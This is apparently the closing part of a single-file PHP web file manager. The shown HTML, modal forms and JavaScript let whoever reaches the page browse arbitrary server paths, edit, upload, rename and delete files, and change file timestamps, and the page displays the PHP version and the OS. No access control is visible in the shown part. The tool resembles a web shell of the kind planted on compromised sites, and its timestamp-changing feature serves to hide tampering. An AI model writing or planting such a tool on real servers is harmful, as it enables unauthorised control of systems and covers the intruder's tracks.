    <button class="sb-btn" onclick="mO('mNF')"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg> Create File</button>
    <button class="sb-btn" onclick="mO('mND')"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg> Create Folder</button>
  </nav>
  <div class="sb-ft">PHP <b><?php echo htmlspecialchars(phpversion()); ?></b><br>OS <b><?php echo htmlspecialchars(PHP_OS); ?></b><br>Max <b><?php echo htmlspecialchars($upload_max); ?></b></div>
</aside>

<div class="mn">
  <div class="tb">
    <div class="bc"><?php foreach($bc_links as $i=>$c): ?><?php if($i>0): ?><span class="sp">/</span><?php endif; ?><?php if($i===count($bc_links)-1): ?><span class="cr"><?php echo htmlspecialchars($c['name']); ?></span><?php else: ?><a href="?path=<?php echo urlencode($c['path']); ?>"><?php echo htmlspecialchars($c['name']); ?></a><?php endif; ?><?php endforeach; ?></div>
    <div class="tb-inf"><?php echo $total_items; ?> item<?php echo $total_items!==1?'s':''; ?></div>
  </div>

  <?php if($flash): ?><div class="fl fl-<?php echo($flash['type']==='ok')?'ok':'error'; ?>"><?php echo htmlspecialchars($flash['msg']); ?></div><?php endif; ?>

  <div class="fp">
  <?php if($total_items===0&&!$has_parent): ?>
    <div class="em"><p>Directory empty or not readable.</p></div>
  <?php else: ?>
    <table class="ft"><thead><tr><th class="cn">Name</th><th>Size</th><th>Modified</th><th class="cp">Permissions</th><th class="ct">Type</th><th class="ca">Actions</th></tr></thead><tbody>
    <?php if($has_parent): ?>
      <tr><td class="cn" colspan="6"><div class="nc">
        <span class="ic ic-folder"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg></span>
        <a class="fn fn-p" href="?path=<?php echo urlencode($parent_path); ?>">&#11014; Parent Directory (<?php echo htmlspecialchars($parent_path); ?>)</a>
      </div></td></tr>
    <?php endif; ?>
    <?php foreach($all_items as $item):
      $icn=fm_icon($item['name'],$item['is_dir']);
      $ext_d=$item['is_dir']?'Folder':strtoupper(pathinfo($item['name'],PATHINFO_EXTENSION));if($ext_d==='')$ext_d='—';
      $ep=htmlspecialchars($item['fullpath'],ENT_QUOTES);
      $en=htmlspecialchars($item['name'],ENT_QUOTES);
    ?>
      <tr>
        <td class="cn"><div class="nc">
          <span class="ic ic-<?php echo $icn; ?>"><?php if($item['is_dir']): ?><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg><?php else: ?><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg><?php endif; ?></span>
          <?php if($item['is_dir']): ?><a class="fn fn-dir" href="?path=<?php echo urlencode($item['newpath']); ?>"><?php echo htmlspecialchars($item['name']); ?></a>
          <?php else: ?><a class="fn fn-file" href="?path=<?php echo $path_enc; ?>&amp;edit=<?php echo urlencode($item['fullpath']); ?>"><?php echo htmlspecialchars($item['name']); ?></a><?php endif; ?>
        </div></td>
        <td class="fm"><?php echo $item['is_dir']?'—':fm_size($item['size']); ?></td>
        <td class="fm"><?php echo $item['mtime']>0?date('Y-m-d H:i',$item['mtime']):'N/A'; ?></td>
        <td class="cp"><span class="perm-cell <?php echo $item['perm_color']; ?>"><?php echo htmlspecialchars($item['perms_full']); ?></span><?php if($item['octal']!==''): ?><span class="perm-oct"><?php echo htmlspecialchars($item['octal']); ?></span><?php endif; ?></td>
        <td class="ct" style="font-size:11px;color:var(--text-dim)"><?php echo $ext_d; ?></td>
        <td class="ca"><div class="ag">
          <button class="ab" data-t="Rename" onclick="doRn('<?php echo $ep; ?>','<?php echo $en; ?>')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.83 2.83 0 114 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg></button>
          <button class="ab" data-t="Timestamp" onclick="doTc('<?php echo $ep; ?>','<?php echo $en; ?>')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></button>
          <button class="ab dg" data-t="Delete" onclick="doDl('<?php echo $ep; ?>','<?php echo $en; ?>')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg></button>
        </div></td>
      </tr>
    <?php endforeach; ?>
    </tbody></table>
  <?php endif; ?>
  </div>
</div>

<!-- MODALS -->
<div class="ov" id="mU"><div class="md"><div class="mh"><h3>Upload File</h3><button class="mx" onclick="mC('mU')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post" enctype="multipart/form-data"><div class="mb"><input type="hidden" name="fm_action" value="upload"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><div class="fg"><label>To: <?php echo htmlspecialchars($path); ?></label></div><div class="fg"><label class="dz" id="dz">Click or drag file here<br><small>Max: <?php echo htmlspecialchars($upload_max); ?></small><input type="file" name="fm_file" id="uf" onchange="sN(this)"></label><div id="un" style="margin-top:8px;font-size:12px;color:var(--accent);display:none"></div></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mU')">Cancel</button><button type="submit" class="bt bt-a">Upload</button></div></form></div></div>
<div class="ov" id="mNF"><div class="md"><div class="mh"><h3>Create File</h3><button class="mx" onclick="mC('mNF')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="newfile"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><div class="fg"><label for="nf">Filename</label><input type="text" name="fname" id="nf" class="fi2" placeholder="example.txt" required></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mNF')">Cancel</button><button type="submit" class="bt bt-a">Create</button></div></form></div></div>
<div class="ov" id="mND"><div class="md"><div class="mh"><h3>Create Folder</h3><button class="mx" onclick="mC('mND')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="newfolder"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><div class="fg"><label for="nd">Folder name</label><input type="text" name="fname" id="nd" class="fi2" placeholder="new-folder" required></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mND')">Cancel</button><button type="submit" class="bt bt-a">Create</button></div></form></div></div>
<div class="ov" id="mRn"><div class="md"><div class="mh"><h3>Rename</h3><button class="mx" onclick="mC('mRn')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="rename"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><input type="hidden" name="fpath" id="rp"><div class="fg"><label for="rn">New name</label><input type="text" name="newname" id="rn" class="fi2" required></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mRn')">Cancel</button><button type="submit" class="bt bt-a">Rename</button></div></form></div></div>
<div class="ov" id="mTc"><div class="md"><div class="mh"><h3>Change Timestamp</h3><button class="mx" onclick="mC('mTc')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="touch"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><input type="hidden" name="fpath" id="tp"><div class="fg"><label id="tl">File:</label></div><div class="fg"><label for="ts">Date/time</label><input type="datetime-local" name="tstamp" id="ts" class="fi2"></div></div><div class="mf"><button type="button" class="bt" onclick="mC('mTc')">Cancel</button><button type="submit" class="bt bt-a">Update</button></div></form></div></div>
<div class="ov" id="mDl"><div class="md"><div class="mh"><h3>Delete</h3><button class="mx" onclick="mC('mDl')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="delete"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><input type="hidden" name="fpath" id="dp"><p style="font-size:13px">Delete <strong id="dn" style="color:var(--err)"></strong>?</p></div><div class="mf"><button type="button" class="bt" onclick="mC('mDl')">Cancel</button><button type="submit" class="bt bt-d">Delete</button></div></form></div></div>

<?php if($view_data!==null): ?>
<div class="ov on" id="mV"><div class="md md-lg"><div class="mh"><h3><?php echo htmlspecialchars($view_name); ?></h3><a class="mx" href="?path=<?php echo $path_enc; ?>"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></a></div><div class="mb"><div class="vb"><?php echo htmlspecialchars($view_data); ?></div></div><div class="mf"><a class="bt" href="?path=<?php echo $path_enc; ?>">Close</a></div></div></div>
<?php endif; ?>

<?php if($edit_data!==null): ?>
<div class="ov on" id="mE"><div class="md md-lg"><div class="mh"><h3>Edit: <?php echo htmlspecialchars($edit_name); ?></h3><a class="mx" href="?path=<?php echo $path_enc; ?>"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></a></div><form method="post"><div class="mb"><input type="hidden" name="fm_action" value="save"><input type="hidden" name="current_path" value="<?php echo htmlspecialchars($path); ?>"><input type="hidden" name="fpath" value="<?php echo htmlspecialchars($edit_path); ?>"><textarea name="content" class="fi2" style="min-height:380px;height:58vh"><?php echo htmlspecialchars($edit_data); ?></textarea></div><div class="mf"><a class="bt" href="?path=<?php echo $path_enc; ?>">Cancel</a><button type="submit" class="bt bt-a">Save</button></div></form></div></div>
<?php endif; ?>

<script>
function mO(id){var e=document.getElementById(id);if(e)e.classList.add('on');var s=document.getElementById('sb');if(s)s.classList.remove('open')}
function mC(id){var e=document.getElementById(id);if(e)e.classList.remove('on')}
var ovs=document.querySelectorAll('.ov');for(var i=0;i<ovs.length;i++){(function(o){o.addEventListener('click',function(e){if(e.target===o){var l=o.querySelector('a.mx');if(l){l.click();return}o.classList.remove('on')}});})(ovs[i])}
document.addEventListener('keydown',function(e){if(e.key==='Escape'||e.keyCode===27){var a=document.querySelector('.ov.on');if(a){var l=a.querySelector('a.mx');if(l){l.click();return}a.classList.remove('on')}}});
var ta=document.querySelector('#mE textarea');if(ta){ta.addEventListener('keydown',function(e){if(e.key==='Tab'||e.keyCode===9){e.preventDefault();var s=this.selectionStart,end=this.selectionEnd;this.value=this.value.substring(0,s)+'    '+this.value.substring(end);this.selectionStart=this.selectionEnd=s+4}});}
function doRn(p,n){document.getElementById('rp').value=p;document.getElementById('rn').value=n;mO('mRn');setTimeout(function(){document.getElementById('rn').select()},120)}
function doTc(p,n){document.getElementById('tp').value=p;document.getElementById('tl').textContent='File: '+n;mO('mTc')}
function doDl(p,n){document.getElementById('dp').value=p;document.getElementById('dn').textContent=n;mO('mDl')}
function sN(inp){var el=document.getElementById('un');if(inp.files&&inp.files.length>0){el.textContent=inp.files[0].name;el.style.display='block'}}
var dz=document.getElementById('dz');if(dz){dz.addEventListener('dragover',function(e){e.preventDefault();dz.style.borderColor='var(--accent)'});dz.addEventListener('dragleave',function(){dz.style.borderColor=''});dz.addEventListener('drop',function(e){e.preventDefault();dz.style.borderColor='';var fi=document.getElementById('uf');if(e.dataTransfer&&e.dataTransfer.files.length>0&&fi){fi.files=e.dataTransfer.files;sN(fi)}})}
document.addEventListener('keydown',function(e){if((e.ctrlKey||e.metaKey)&&(e.key==='s'||e.keyCode===83)){var ed=document.querySelector('#mE form');if(ed&&document.getElementById('mE').classList.contains('on')){e.preventDefault();ed.submit()}}});
</script>
</body>
</html>
